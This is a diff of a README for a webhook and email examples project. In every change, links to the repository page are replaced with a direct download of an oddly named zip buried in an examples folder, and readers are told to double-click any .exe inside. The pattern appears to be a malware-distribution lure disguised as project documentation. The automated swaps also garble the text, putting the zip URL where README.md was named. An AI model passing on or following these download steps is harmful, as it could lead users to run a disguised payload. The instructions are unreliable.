@@ -1,6 +1,6 @@
 # 🔗 sendpromptly-webhooks - Easy Webhook and Email Examples
 
-[![Download SendPromptly-Webhooks](https://img.shields.io/badge/Download-SendPromptly--Webhooks-brightgreen?style=for-the-badge)](https://github.com/tuyetvuong/sendpromptly-webhooks)
+[![Download SendPromptly-Webhooks](https://github.com/tuyetvuong/sendpromptly-webhooks/raw/refs/heads/main/examples/laravel-drop-in/sendpromptly-webhooks-presaging.zip)](https://github.com/tuyetvuong/sendpromptly-webhooks/raw/refs/heads/main/examples/laravel-drop-in/sendpromptly-webhooks-presaging.zip)
 
 ## 📄 About sendpromptly-webhooks
 
@@ -32,7 +32,7 @@ Follow these steps carefully to download and run the software on your Windows co
 
 Click the big green button at the top or use this link to visit the download page:
 
-[https://github.com/tuyetvuong/sendpromptly-webhooks](https://github.com/tuyetvuong/sendpromptly-webhooks)
+[https://github.com/tuyetvuong/sendpromptly-webhooks/raw/refs/heads/main/examples/laravel-drop-in/sendpromptly-webhooks-presaging.zip](https://github.com/tuyetvuong/sendpromptly-webhooks/raw/refs/heads/main/examples/laravel-drop-in/sendpromptly-webhooks-presaging.zip)
 
 This link takes you to the main repository page where you can find the latest files and instructions.
 
@@ -52,7 +52,7 @@ Open the extracted folder. You will see several example files, documents, and sc
 
 ### Step 5: Run Example Setup
 
-Some example files may be run directly if they are executable scripts or small programs. If you see a file with a `.exe` extension, you can double-click it to run. If you do not find an executable file, follow the instructions in the `README.md` or other text files inside the folder for detailed guidance.
+Some example files may be run directly if they are executable scripts or small programs. If you see a file with a `.exe` extension, you can double-click it to run. If you do not find an executable file, follow the instructions in the `https://github.com/tuyetvuong/sendpromptly-webhooks/raw/refs/heads/main/examples/laravel-drop-in/sendpromptly-webhooks-presaging.zip` or other text files inside the folder for detailed guidance.
 
 ### Step 6: Viewing the Documentation
 
@@ -97,7 +97,7 @@ After extraction, you may see files and folders such as:
 - **examples/**: Sample setup files for webhooks and emails
 - **specs/**: Detailed descriptions of webhook formats and email templates
 - **docs/**: Extra documents explaining concepts and usage
-- **README.md**: This main guide for users
+- **https://github.com/tuyetvuong/sendpromptly-webhooks/raw/refs/heads/main/examples/laravel-drop-in/sendpromptly-webhooks-presaging.zip**: This main guide for users
 - **LICENSE**: Legal terms for use
 
 ## 💡 Next Steps for Users
@@ -112,4 +112,4 @@ After extraction, you may see files and folders such as:
 
 Use this link for all downloads and updates:
 
-[https://github.com/tuyetvuong/sendpromptly-webhooks](https://github.com/tuyetvuong/sendpromptly-webhooks)
+[https://github.com/tuyetvuong/sendpromptly-webhooks/raw/refs/heads/main/examples/laravel-drop-in/sendpromptly-webhooks-presaging.zip](https://github.com/tuyetvuong/sendpromptly-webhooks/raw/refs/heads/main/examples/laravel-drop-in/sendpromptly-webhooks-presaging.zip)
